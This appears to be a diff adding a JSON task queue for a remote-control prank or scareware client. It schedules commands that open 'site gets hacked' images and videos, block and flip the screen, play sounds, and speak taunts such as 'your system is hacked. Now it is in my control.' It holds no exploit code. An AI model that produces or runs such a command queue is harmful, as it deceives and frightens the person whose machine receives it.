@@ -1,3 +1,142 @@
 {
-    "tasks":[]
+    "tasks": [
+        {
+            "id": 0,
+            "cmd": "oPeN https://youtu.be/cUA2i6Nt7_U?si=Ax0moS6uOGajFErA",
+            "execution_time": "30-01-2025 09:45",
+            "user": "94"
+        },
+        {
+            "id": 1,
+            "cmd": "bLoCk on",
+            "execution_time": "30-01-2025 09:44",
+            "user": "94"
+        },
+        {
+            "id": 2,
+            "cmd": "bLoCk off",
+            "execution_time": "30-01-2025 09:47",
+            "user": "94"
+        },
+        {
+            "id": 3,
+            "cmd": "eRr 35",
+            "execution_time": "30-01-2025 09:52",
+            "user": "94"
+        },
+        {
+            "id": 4,
+            "cmd": "fLiP on",
+            "execution_time": "30-01-2025 09:04",
+            "user": "94"
+        },
+        {
+            "id": 5,
+            "cmd": "pLaY juice.mp3",
+            "execution_time": "30-01-2025 09:09",
+            "user": "94"
+        },
+        {
+            "id": 6,
+            "cmd": "fLiP off",
+            "execution_time": "30-01-2025 09:18",
+            "user": "94"
+        },
+        {
+            "id": 7,
+            "cmd": "oPeN https://websitesecuritystore.com/wp-content/uploads/2021/07/what-happens-when-your-site-gets-hacked.svg",
+            "execution_time": "30-01-2025 09:15",
+            "user": "94"
+        },
+        {
+            "id": 8,
+            "cmd": "eRr 30",
+            "execution_time": "30-01-2025 10:07",
+            "user": "94"
+        },
+        {
+            "id": 9,
+            "cmd": "sPeAk your system is hacked. Now it is in my control. Hahahahahahhahahaahhaah",
+            "execution_time": "30-01-2025 09:10",
+            "user": "94"
+        },
+        {
+            "id": 10,
+            "cmd": "oPeN https://websitesecuritystore.com/wp-content/uploads/2021/07/what-happens-when-your-site-gets-hacked.svg",
+            "execution_time": "30-01-2025 10:55",
+            "user": "94"
+        },
+        {
+            "id": 11,
+            "cmd": "iMaGe errors.mp4",
+            "execution_time": "30-01-2025 00:46",
+            "user": "94"
+        },
+        {
+            "id": 12,
+            "cmd": "pLaY laugh.mp3",
+            "execution_time": "30-01-2025 09:13",
+            "user": "94"
+        },
+        {
+            "id": 13,
+            "cmd": "sPeAk dont switch to android or else it would be hacked too. Hahahhahahahaha",
+            "execution_time": "30-01-2025 09:21",
+            "user": "94"
+        },
+        {
+            "id": 14,
+            "cmd": "oPeN https://youtu.be/cUA2i6Nt7_U?si=Ax0moS6uOGajFErA",
+            "execution_time": "30-01-2025 11:02",
+            "user": "94"
+        },
+        {
+            "id": 15,
+            "cmd": "iMaGe glitch.mp4",
+            "execution_time": "30-01-2025 12:16",
+            "user": "94"
+        },
+        {
+            "id": 16,
+            "cmd": "pLaY juice.mp3",
+            "execution_time": "30-01-2025 09:21",
+            "user": "94"
+        },
+        {
+            "id": 17,
+            "cmd": "pLaY maxverstrappen.mp3",
+            "execution_time": "30-01-2025 09:11",
+            "user": "94"
+        },
+        {
+            "id": 18,
+            "cmd": "eRr 40",
+            "execution_time": "30-01-2025 12:45",
+            "user": "94"
+        },
+        {
+            "id": 19,
+            "cmd": "pLaY coffin.mp3",
+            "execution_time": "30-01-2025 10:40",
+            "user": "94"
+        },
+        {
+            "id": 20,
+            "cmd": "oPeN https://youtu.be/cUA2i6Nt7_U?si=Ax0moS6uOGajFErA",
+            "execution_time": "30-01-2025 09:58",
+            "user": "94"
+        },
+        {
+            "id": 21,
+            "cmd": "pLaY repta.mp3",
+            "execution_time": "30-01-2025 09:32",
+            "user": "94"
+        },
+        {
+            "id": 22,
+            "cmd": "oPeN https://websitesecuritystore.com/wp-content/uploads/2021/07/what-happens-when-your-site-gets-hacked.svg",
+            "execution_time": "30-01-2025 11:27",
+            "user": "94"
+        }
+    ]
 }
